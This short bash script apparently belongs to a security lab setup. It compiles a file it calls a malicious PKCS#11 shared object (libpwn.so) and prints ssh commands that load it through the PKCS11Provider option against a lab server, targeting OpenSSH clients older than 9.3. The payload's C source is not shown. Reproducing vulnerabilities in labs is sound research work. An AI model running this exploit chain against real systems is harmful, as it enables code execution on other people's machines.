#!/bin/bash
set -euo pipefail

OUTPUT_DIR=/payloads
mkdir -p "$OUTPUT_DIR"

echo "[*] Building malicious PKCS#11 shared object"
cc -shared -fPIC -O2 -o "$OUTPUT_DIR/libpwn.so" /opt/poc.c

echo "[+] Payload compiled: $OUTPUT_DIR/libpwn.so"
cat <<'INSTRUCTIONS'
To exercise the vulnerability (requires vulnerable ssh client < 9.3):

ssh -F /dev/null \
    -o 'ProxyCommand=ssh -W %h:%p lab@openssh-server-lab' \
    -o 'PKCS11Provider=/payloads/libpwn.so' \
    lab@openssh-server-lab -p 22

This triggers the vulnerable PKCS#11 code path and loads the payload, printing
an execution banner in the victim SSH session.
INSTRUCTIONS

sleep infinity
